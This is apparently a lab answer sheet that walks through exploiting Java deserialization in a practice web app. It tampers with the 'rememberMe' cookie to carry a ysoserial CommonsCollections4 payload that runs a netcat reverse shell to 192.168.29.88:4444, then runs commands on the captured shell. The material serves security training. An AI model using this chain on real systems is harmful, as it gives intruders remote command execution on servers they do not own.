# Java Deserialization Answersheet

**Step 1:** Click on "Java Website: 16661" link
<kbd> <img src="1.png" /> </kbd>
<br /> <br />

**Step 2:** Provide the following credential and tick the "Remember Me" option and click on Submit button.
```
Username: admin
Password: password
```
Note: The registration functionality is disabled for this application.
<kbd> <img src="2.png" /> </kbd>
<br /> <br />

**Step 3:** Capture the HTTP request and send this request to repeater "Right Click -> Send to Repeater".
<kbd> <img src="3.png" /> </kbd>
<br /> <br />

**Step 4:** Click on "send" button and observe that the server respond with "rememberMe" cookie which has java serialized magic string starting with "rO0".
<kbd> <img src="4.png" /> </kbd>
<br /> <br />

**Step 5:** Observe the serialized value after decode it with Base64.
<kbd> <img src="5.png" /> </kbd>
<br /> <br />

**Step 6:** Forward the request captured in **Step 3** and click on "Login" button.
<kbd> <img src="6.png" /> </kbd>
<br /> <br />

**Step 7:** Download the YSoSerial utility from following location, and use the following command to check the payload available.
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
```
java -jar ysoserial-master-SNAPSHOT.jar
```
<kbd> <img src="7.png" /> </kbd>
<br /> <br />

**Step 8:** Capture the IP address and use that to generate the reverse shell payload using following command and capture the generated payload.
```
java -jar ysoserial-master-SNAPSHOT.jar CommonCollections4 "nc 192.168.29.88 4444 -e /bin/bash" | base64 -w 0
```
<kbd> <img src="8.png" /> </kbd>
<br /> <br />

**Step 9:** Start the listener using following command
```
nc -nlvp 4444
```
<kbd> <img src="9.png" /> </kbd>
<br /> <br />

**Step 10:** Replace the payload generated in **Step 8** in "RememberMe" parameter and click on "send" button to send request to the server.
<kbd> <img src="10.png" /> </kbd>
<br /> <br />

**Step 11:** Received the reverse shell and obtained the server information using whoami, uname -a, ifconfig.
<kbd> <img src="11.png" /> </kbd>
<br /> <br />